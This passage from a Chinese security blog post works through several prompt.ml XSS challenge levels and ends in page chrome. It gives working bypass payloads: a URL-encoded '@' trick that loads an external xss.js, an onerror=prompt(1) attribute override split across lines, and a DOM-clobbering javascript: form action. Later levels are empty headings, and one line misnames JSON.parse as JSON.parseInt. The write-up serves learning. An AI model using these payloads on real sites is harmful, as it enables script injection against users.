+<blockquote>
+<ol>
+<li><code>URI</code> 完整的格式，以及符号 @ 的作用；</li>
+<li><code>decodeURIComponent()</code> 函数的作用，以及 <code>escape</code> 、<code>encodeURIComponent</code>、<code>decodeURIComponent</code> 和 <code>unescape</code> 函数的功能；</li>
+<li>正则表达式后的 <code>i</code>、<code>g</code>、<code>gi</code>、<code>ig</code> 和 <code>m</code> 的含义：</li>
+</ol>
+<ul>
+<li><code>i</code>：忽略大小写</li>
+<li><code>g</code>：全文查找出现的所有匹配字符</li>
+<li><code>gi</code> 和 <code>ig</code>：全文查找、忽略大小写</li>
+<li><code>m</code>：多行查找</li>
+</ul>
+</blockquote>
+<h4 id="4-payload-5"><a class="markdownIt-Anchor" href="#4-payload-5"></a> <code>④ payload</code></h4>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://prompt.ml%2f@localhost/xss.js</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>如果我们输入的 payload 必须完全符合  JS 代码中的限制，那么就得是这个形式：</p>
+<p><code>https://prompt.ml/@localhost/xss.js</code></p>
+<p>但是浏览器识别的正确 URI 是这样的：</p>
+<p><img src="/images/95-1.png" alt></p>
+<p>综上考虑，我们的输入必须要满足的<code>两个条件相互矛盾</code>，但是我们可以利用 <code>decodeURIComponent()</code> 函数的功能：<code>将一些符号的 URL 编码解码为对应的符号</code>，那么我们的输入就可以将 <code>@</code> 前面的 <code>/</code>  符号写成它的 URL 编码：<code>%2f</code>，因此得到上述的 payload。</p>
+<p><code>注明</code>：此 payload 在谷歌浏览器上可能不会正常执行，因为 chrome 在 2017 年规定<a href="https://www.chromestatus.com/feature/5669008342777856" target="_blank" rel="noopener"><code>内嵌资源不让加用户名密码了</code></a>，所以上述的 payload 需要在火狐浏览器才能被执行。</p>
+</blockquote>
+<h4 id="5-html-source-5"><a class="markdownIt-Anchor" href="#5-html-source-5"></a> <code>⑤ HTML source</code></h4>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=<span class="string">"https://prompt.ml%2f@muzibing.github.io/xss.js"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<h4 id="6-xss-类型-5"><a class="markdownIt-Anchor" href="#6-xss-类型-5"></a> <code>⑥ xss 类型</code></h4>
+<blockquote>
+<p>利用 <code>URI</code> 格式的特性以及函数的功能的 <code>URL编码绕过</code> 题目。</p>
+</blockquote>
+<h3 id="font-color-navy0x05-属性覆盖及换行绕过font"><a class="markdownIt-Anchor" href="#font-color-navy0x05-属性覆盖及换行绕过font"></a> <font color="navy">0x05 属性覆盖及换行绕过</font></h3>
+<h4 id="1-js-代码-6"><a class="markdownIt-Anchor" href="#1-js-代码-6"></a> <code>① JS 代码</code></h4>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// apply strict filter rules of level 0</span></span><br><span class="line">    <span class="comment">// filter "&gt;" and event handlers</span></span><br><span class="line">    input = input.replace(<span class="regexp">/&gt;|on.+?=|focus/gi</span>, <span class="string">'_'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">'&lt;input value="'</span> + input + <span class="string">'" type="text"&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-题目分析-6"><a class="markdownIt-Anchor" href="#2-题目分析-6"></a> <code>② 题目分析</code></h4>
+<blockquote>
+<p>JS 代码对 <code>&gt;</code>、<code>on* =</code>和 <code>focus</code> 对大小写不敏感的进行全局匹配，然后将输入放到 <code>input</code> 中的 <code>value</code> 值中。</p>
+</blockquote>
+<h4 id="3-相关知识点-6"><a class="markdownIt-Anchor" href="#3-相关知识点-6"></a> <code>③ 相关知识点</code></h4>
+<blockquote>
+<ol>
+<li>对 &lt;input&gt; 标签属性的覆盖：以第一个出现的为真实值（第一个出现的属性值将后续相同属性名的值进行覆盖）；</li>
+<li>事件（还包括标签名，属性等）与等号可以不在一行，一样会被执行；</li>
+</ol>
+</blockquote>
+<h4 id="4-payload-6"><a class="markdownIt-Anchor" href="#4-payload-6"></a> <code>④ payload</code></h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">" type="image" src="2" onerror </span><br><span class="line">=prompt(1)"</span><br><span class="line"></span><br><span class="line">=======================================</span><br><span class="line">还可以写成如下，也可以执行：</span><br><span class="line">" type=</span><br><span class="line">"image" </span><br><span class="line">src=</span><br><span class="line">"2" </span><br><span class="line">onerror </span><br><span class="line">=</span><br><span class="line">prompt(1)  "</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>通过对属性 <code>type</code> 值的覆盖，使得 <code>input</code> 的属性变为 <code>image</code> ，通过加载图片有误，触发 <code>onerror</code> 事件。</p>
+</blockquote>
+<h4 id="5-html-source-6"><a class="markdownIt-Anchor" href="#5-html-source-6"></a> <code>⑤ HTML source</code></h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">""</span> <span class="attr">type</span>=<span class="string">"image"</span> <span class="attr">src</span>=<span class="string">"2"</span> <span class="attr">onerror</span> </span></span><br><span class="line"><span class="tag">=<span class="string">prompt(1)</span>"" <span class="attr">type</span>=<span class="string">"text"</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="6-xss-类型-6"><a class="markdownIt-Anchor" href="#6-xss-类型-6"></a> <code>⑥ xss 类型</code></h4>
+<blockquote>
+<p><code>input</code> 属性值的覆盖类型题目</p>
+</blockquote>
+<h3 id="font-color-navy0x06-dom-破坏font"><a class="markdownIt-Anchor" href="#font-color-navy0x06-dom-破坏font"></a> <font color="navy">0x06 DOM 破坏</font></h3>
+<h4 id="1-js-代码-7"><a class="markdownIt-Anchor" href="#1-js-代码-7"></a> <code>① JS 代码</code></h4>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// let's do a post redirection</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// pass in formURL#formDataJSON</span></span><br><span class="line">        <span class="comment">// e.g. http://httpbin.org/post#&#123;"name":"Matt"&#125;</span></span><br><span class="line">        <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">        <span class="keyword">var</span> formURL = segments[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">var</span> formData = <span class="built_in">JSON</span>.parse(segments[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> form = <span class="built_in">document</span>.createElement(<span class="string">'form'</span>);</span><br><span class="line">        form.action = formURL;</span><br><span class="line">        form.method = <span class="string">'post'</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">var</span> i <span class="keyword">in</span> formData) &#123;</span><br><span class="line">            <span class="keyword">var</span> input = form.appendChild(<span class="built_in">document</span>.createElement(<span class="string">'input'</span>));</span><br><span class="line">            input.name = i;</span><br><span class="line">            input.setAttribute(<span class="string">'value'</span>, formData[i]);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> form.outerHTML + <span class="string">'                         \n\</span></span><br><span class="line"><span class="string">&lt;script&gt;                                                  \n\</span></span><br><span class="line"><span class="string">    // forbid javascript: or vbscript: and data: stuff    \n\</span></span><br><span class="line"><span class="string">    if (!/script:|data:/i.test(document.forms[0].action)) \n\</span></span><br><span class="line"><span class="string">        document.forms[0].submit();                       \n\</span></span><br><span class="line"><span class="string">    else                                                  \n\</span></span><br><span class="line"><span class="string">        document.write("Action forbidden.")               \n\</span></span><br><span class="line"><span class="string">&lt;/script&gt;                                                 \n\</span></span><br><span class="line"><span class="string">        '</span>;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">'Invalid form data.'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-题目分析-7"><a class="markdownIt-Anchor" href="#2-题目分析-7"></a> <code>② 题目分析</code></h4>
+<blockquote>
+<p><code>try</code> 模块内的代码主要功能是：将输入的字符串划分为两部分，一部分是 <code>URI</code>，另一个部分是 <code>JSON</code> 数据，再建立一个<code>form</code> 标签，将 URL 赋值给 <code>action</code> 属性，对 <code>method</code> 赋值 <code>post</code> 方法。如果 <code>form</code> 中的 <code>action</code> 属性是伪协议就输出 <code>Action forbideen</code>。</p>
+</blockquote>
+<h4 id="3-相关知识点-7"><a class="markdownIt-Anchor" href="#3-相关知识点-7"></a> <code>③ 相关知识点</code></h4>
+<blockquote>
+<ol>
+<li>DOM 破坏后，<code>form</code> 标签中属性<code>ID</code> 和 <code>name</code>的变化</li>
+</ol>
+<ul>
+<li><code>如果form元素的某个属性名和 input 元素的 id/name 值一样，那么该 form 的属性就会被 input 元素的属性值所覆盖。</code></li>
+<li>并不是某些博客中所写的：<code>action有这样的一个特性，如果前后都有action，访问action标签时访问的是后面的action的值。</code>。而且在同一个标签中，存在相同名称的属性，第一个出现的属性值将后续相同属性名的值进行覆盖；</li>
+</ul>
+<ol start="2">
+<li><code>JSON 数据</code>的读取函数：<code>JSON.parseInt()</code></li>
+<li><code>form 标签</code>的 <code>action 属性</code>以及其他知识点</li>
+</ol>
+</blockquote>
+<h4 id="4-payload-7"><a class="markdownIt-Anchor" href="#4-payload-7"></a> <code>④ payload</code></h4>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascript:prompt(1)#&#123;"action":"text"&#125;</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>payload 被分解成如下 <code>HTML source</code> 的形式：</p>
+<p><code>&lt;form action=&quot;javascript:prompt(1)&quot; method=&quot;post&quot;&gt;&lt;input name=&quot;action&quot; value=&quot;text&quot;&gt;&lt;/form&gt;</code></p>
+<p>将前面的伪协议添加 <code>action</code> 的属性值，并将 <code>JSON</code> 数据中的 <code>&quot;action&quot;</code> 赋值给 <code>input</code> 标签中的 <code>name</code> 属性，并将 <code>text</code> 赋值给 <code>value</code> 值。因为 <code>DOM</code> 被破坏，所以 <code>document.forms[0].action</code> 的 <code>action</code> 是 <code>input</code> 中的 <code>name</code> 的 <code>action</code>，为<code>object HTMLInputElement</code> 所以 <code>if</code> 条件为真，执行 <code>document.forms[0].submit()</code> ，向 <code>javascript:prompt</code> 提交表单，成功执行脚本。</p>
+</blockquote>
+<h4 id="5-html-source-7"><a class="markdownIt-Anchor" href="#5-html-source-7"></a> <code>⑤ HTML source</code></h4>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"javascript:prompt(1)"</span> <span class="attr">method</span>=<span class="string">"post"</span>&gt;</span><span class="tag">&lt;<span class="name">input</span> <span class="attr">name</span>=<span class="string">"action"</span> <span class="attr">value</span>=<span class="string">"text"</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">                                                  </span></span><br><span class="line"><span class="actionscript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"Action forbidden."</span>)               </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">form</span>&gt;</span>                         </span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">                                                  </span></span><br><span class="line"><span class="actionscript">    <span class="comment">// forbid javascript: or vbscript: and data: stuff    </span></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> (!<span class="regexp">/script:|data:/i</span>.test(<span class="built_in">document</span>.forms[<span class="number">0</span>].action)) </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();                       </span></span><br><span class="line"><span class="actionscript">    <span class="keyword">else</span>                                                  </span></span><br><span class="line"><span class="javascript">        <span class="built_in">document</span>.write(<span class="string">"Action forbidden."</span>)               </span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<h4 id="6-xss-类型-7"><a class="markdownIt-Anchor" href="#6-xss-类型-7"></a> <code>⑥ xss 类型</code></h4>
+<blockquote>
+<p>通过破坏 DOM，使得 id 和 name 属性混乱，达到绕过的作用。</p>
+</blockquote>
+<h3 id="font-color-navy0x07font"><a class="markdownIt-Anchor" href="#font-color-navy0x07font"></a> <font color="navy">0x07</font></h3>
+<h4 id="1-js-代码-8"><a class="markdownIt-Anchor" href="#1-js-代码-8"></a> <code>① JS 代码</code></h4>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">input</span>) </span>&#123;</span><br><span class="line">    <span class="comment">// pass in something like dog#cat#bird#mouse...</span></span><br><span class="line">    <span class="keyword">var</span> segments = input.split(<span class="string">'#'</span>);</span><br><span class="line">    <span class="keyword">return</span> segments.map(<span class="function"><span class="keyword">function</span>(<span class="params">title</span>) </span>&#123;</span><br><span class="line">        <span class="comment">// title can only contain 12 characters</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">'&lt;p class="comment" title="'</span> + title.slice(<span class="number">0</span>, <span class="number">12</span>) + <span class="string">'"&gt;&lt;/p&gt;'</span>;</span><br><span class="line">    &#125;).join(<span class="string">'\n'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h4 id="2-题目分析-8"><a class="markdownIt-Anchor" href="#2-题目分析-8"></a> <code>② 题目分析</code></h4>
+<blockquote></blockquote>
+<h4 id="3-相关知识点-8"><a class="markdownIt-Anchor" href="#3-相关知识点-8"></a> <code>③ 相关知识点</code></h4>
+<h4 id="4-payload-8"><a class="markdownIt-Anchor" href="#4-payload-8"></a> <code>④ payload</code></h4>
+<h4 id="5-html-source-8"><a class="markdownIt-Anchor" href="#5-html-source-8"></a> <code>⑤ HTML source</code></h4>
+<h4 id="6-xss-类型-8"><a class="markdownIt-Anchor" href="#6-xss-类型-8"></a> <code>⑥ xss 类型</code></h4>
+<h3 id="font-color-navy0x08font"><a class="markdownIt-Anchor" href="#font-color-navy0x08font"></a> <font color="navy">0x08</font></h3>
+<h4 id="1-js-代码-9"><a class="markdownIt-Anchor" href="#1-js-代码-9"></a> <code>① JS 代码</code></h4>
+<h4 id="2-题目分析-9"><a class="markdownIt-Anchor" href="#2-题目分析-9"></a> <code>② 题目分析</code></h4>
+<h4 id="3-相关知识点-9"><a class="markdownIt-Anchor" href="#3-相关知识点-9"></a> <code>③ 相关知识点</code></h4>
+<h4 id="4-payload-9"><a class="markdownIt-Anchor" href="#4-payload-9"></a> <code>④ payload</code></h4>
+<h4 id="5-html-source-9"><a class="markdownIt-Anchor" href="#5-html-source-9"></a> <code>⑤ HTML source</code></h4>
+<h4 id="6-xss-类型-9"><a class="markdownIt-Anchor" href="#6-xss-类型-9"></a> <code>⑥ xss 类型</code></h4>
+<h3 id="font-color-navy0x09font"><a class="markdownIt-Anchor" href="#font-color-navy0x09font"></a> <font color="navy">0x09</font></h3>
+<h4 id="1-js-代码-10"><a class="markdownIt-Anchor" href="#1-js-代码-10"></a> <code>① JS 代码</code></h4>
+<h4 id="2-题目分析-10"><a class="markdownIt-Anchor" href="#2-题目分析-10"></a> <code>② 题目分析</code></h4>
+<h4 id="3-相关知识点-10"><a class="markdownIt-Anchor" href="#3-相关知识点-10"></a> <code>③ 相关知识点</code></h4>
+<h4 id="4-payload-10"><a class="markdownIt-Anchor" href="#4-payload-10"></a> <code>④ payload</code></h4>
+<h4 id="5-html-source-10"><a class="markdownIt-Anchor" href="#5-html-source-10"></a> <code>⑤ HTML source</code></h4>
+<h4 id="6-xss-类型-10"><a class="markdownIt-Anchor" href="#6-xss-类型-10"></a> <code>⑥ xss 类型</code></h4>
+<h3 id="font-color-navy0x0afont"><a class="markdownIt-Anchor" href="#font-color-navy0x0afont"></a> <font color="navy">0x0A</font></h3>
+<h4 id="1-js-代码-11"><a class="markdownIt-Anchor" href="#1-js-代码-11"></a> <code>① JS 代码</code></h4>
+<h4 id="2-题目分析-11"><a class="markdownIt-Anchor" href="#2-题目分析-11"></a> <code>② 题目分析</code></h4>
+<h4 id="3-相关知识点-11"><a class="markdownIt-Anchor" href="#3-相关知识点-11"></a> <code>③ 相关知识点</code></h4>
+<h4 id="4-payload-11"><a class="markdownIt-Anchor" href="#4-payload-11"></a> <code>④ payload</code></h4>
+<h4 id="5-html-source-11"><a class="markdownIt-Anchor" href="#5-html-source-11"></a> <code>⑤ HTML source</code></h4>
+<h4 id="6-xss-类型-11"><a class="markdownIt-Anchor" href="#6-xss-类型-11"></a> <code>⑥ xss 类型</code></h4>
+<h3 id="font-color-navy0x0bfont"><a class="markdownIt-Anchor" href="#font-color-navy0x0bfont"></a> <font color="navy">0x0B</font></h3>
+<h4 id="1-js-代码-12"><a class="markdownIt-Anchor" href="#1-js-代码-12"></a> <code>① JS 代码</code></h4>
+<h4 id="2-题目分析-12"><a class="markdownIt-Anchor" href="#2-题目分析-12"></a> <code>② 题目分析</code></h4>
+<h4 id="3-相关知识点-12"><a class="markdownIt-Anchor" href="#3-相关知识点-12"></a> <code>③ 相关知识点</code></h4>
+<h4 id="4-payload-12"><a class="markdownIt-Anchor" href="#4-payload-12"></a> <code>④ payload</code></h4>
+<h4 id="5-html-source-12"><a class="markdownIt-Anchor" href="#5-html-source-12"></a> <code>⑤ HTML source</code></h4>
+<h4 id="6-xss-类型-12"><a class="markdownIt-Anchor" href="#6-xss-类型-12"></a> <code>⑥ xss 类型</code></h4>
+<h3 id="font-color-navy0x0cfont"><a class="markdownIt-Anchor" href="#font-color-navy0x0cfont"></a> <font color="navy">0x0C</font></h3>
+<h4 id="1-js-代码-13"><a class="markdownIt-Anchor" href="#1-js-代码-13"></a> <code>① JS 代码</code></h4>
+<h4 id="2-题目分析-13"><a class="markdownIt-Anchor" href="#2-题目分析-13"></a> <code>② 题目分析</code></h4>
+<h4 id="3-相关知识点-13"><a class="markdownIt-Anchor" href="#3-相关知识点-13"></a> <code>③ 相关知识点</code></h4>
+<h4 id="4-payload-13"><a class="markdownIt-Anchor" href="#4-payload-13"></a> <code>④ payload</code></h4>
+<h4 id="5-html-source-13"><a class="markdownIt-Anchor" href="#5-html-source-13"></a> <code>⑤ HTML source</code></h4>
+<h4 id="6-xss-类型-13"><a class="markdownIt-Anchor" href="#6-xss-类型-13"></a> <code>⑥ xss 类型</code></h4>
+<h3 id="font-color-navy0x0dfont"><a class="markdownIt-Anchor" href="#font-color-navy0x0dfont"></a> <font color="navy">0x0D</font></h3>
+<h4 id="1-js-代码-14"><a class="markdownIt-Anchor" href="#1-js-代码-14"></a> <code>① JS 代码</code></h4>
+<h4 id="2-题目分析-14"><a class="markdownIt-Anchor" href="#2-题目分析-14"></a> <code>② 题目分析</code></h4>
+<h4 id="3-相关知识点-14"><a class="markdownIt-Anchor" href="#3-相关知识点-14"></a> <code>③ 相关知识点</code></h4>
+<h4 id="4-payload-14"><a class="markdownIt-Anchor" href="#4-payload-14"></a> <code>④ payload</code></h4>
+<h4 id="5-html-source-14"><a class="markdownIt-Anchor" href="#5-html-source-14"></a> <code>⑤ HTML source</code></h4>
+<h4 id="6-xss-类型-14"><a class="markdownIt-Anchor" href="#6-xss-类型-14"></a> <code>⑥ xss 类型</code></h4>
+<h3 id="font-color-navy0x0efont"><a class="markdownIt-Anchor" href="#font-color-navy0x0efont"></a> <font color="navy">0x0E</font></h3>
+<h4 id="1-js-代码-15"><a class="markdownIt-Anchor" href="#1-js-代码-15"></a> <code>① JS 代码</code></h4>
+<h4 id="2-题目分析-15"><a class="markdownIt-Anchor" href="#2-题目分析-15"></a> <code>② 题目分析</code></h4>
+<h4 id="3-相关知识点-15"><a class="markdownIt-Anchor" href="#3-相关知识点-15"></a> <code>③ 相关知识点</code></h4>
+<h4 id="4-payload-15"><a class="markdownIt-Anchor" href="#4-payload-15"></a> <code>④ payload</code></h4>
+<h4 id="5-html-source-15"><a class="markdownIt-Anchor" href="#5-html-source-15"></a> <code>⑤ HTML source</code></h4>
+<h4 id="6-xss-类型-15"><a class="markdownIt-Anchor" href="#6-xss-类型-15"></a> <code>⑥ xss 类型</code></h4>
+<h3 id="font-color-navy0x0ffont"><a class="markdownIt-Anchor" href="#font-color-navy0x0ffont"></a> <font color="navy">0x0F</font></h3>
+<h4 id="1-js-代码-16"><a class="markdownIt-Anchor" href="#1-js-代码-16"></a> <code>① JS 代码</code></h4>
+<h4 id="2-题目分析-16"><a class="markdownIt-Anchor" href="#2-题目分析-16"></a> <code>② 题目分析</code></h4>
+<h4 id="3-相关知识点-16"><a class="markdownIt-Anchor" href="#3-相关知识点-16"></a> <code>③ 相关知识点</code></h4>
+<h4 id="4-payload-16"><a class="markdownIt-Anchor" href="#4-payload-16"></a> <code>④ payload</code></h4>
+<h4 id="5-html-source-16"><a class="markdownIt-Anchor" href="#5-html-source-16"></a> <code>⑤ HTML source</code></h4>
+<h4 id="6-xss-类型-16"><a class="markdownIt-Anchor" href="#6-xss-类型-16"></a> <code>⑥ xss 类型</code></h4>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://muzibing.github.io">MUZIBing</a>
+            </p><p>原文链接：<a href="https://muzibing.github.io/2020/02/27/2020.02.27（96）/">https://muzibing.github.io/2020/02/27/2020.02.27（96）/</a>
+            </p><p>发表日期：<a href="https://muzibing.github.io/2020/02/27/2020.02.27（96）/">February 27th 2020, 12:00:00 am</a>
+            </p><p>更新日期：<a href="https://muzibing.github.io/2020/02/27/2020.02.27（96）/">February 27th 2020, 11:38:39 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2020/02/24/2020.02.24（95）/" title="【知识点整理】 浏览器编码">
+                    <div class="prevTitle">【知识点整理】 浏览器编码</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC80Mjk3OS8xOTUyNQ==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:1527305742@qq.com" class="iconfont-archer email" title="email"></a>
+            
+        
+    
+        
+            
+                <a href="//muzibing.github.io" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+            
+                <span class="iconfont-archer wechat" title="wechat">
+                  
+                  <img class="profile-qr" src="/assets/example_qr.png">
+                </span>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x00-简单闭合问题font"><span class="toc-number">1.</span> <span class="toc-text"> 0x00 简单闭合问题</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码"><span class="toc-number">1.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析"><span class="toc-number">1.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点"><span class="toc-number">1.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload"><span class="toc-number">1.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source"><span class="toc-number">1.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型"><span class="toc-number">1.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x01-单标签绕过font"><span class="toc-number">2.</span> <span class="toc-text"> 0x01 单标签绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-2"><span class="toc-number">2.1.</span> <span class="toc-text"> ① JS 代码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-题目分析-2"><span class="toc-number">2.2.</span> <span class="toc-text"> ② 题目分析</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-相关知识点-2"><span class="toc-number">2.3.</span> <span class="toc-text"> ③ 相关知识点</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-payload-2"><span class="toc-number">2.4.</span> <span class="toc-text"> ④ payload</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-html-source-2"><span class="toc-number">2.5.</span> <span class="toc-text"> ⑤ HTML source</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#6-xss-类型-2"><span class="toc-number">2.6.</span> <span class="toc-text"> ⑥ xss 类型</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#font-color-navy0x02-实体编码绕过font"><span class="toc-number">3.</span> <span class="toc-text"> 0x02 实体编码绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-js-代码-3"><span class="toc-number">3.1.</span> 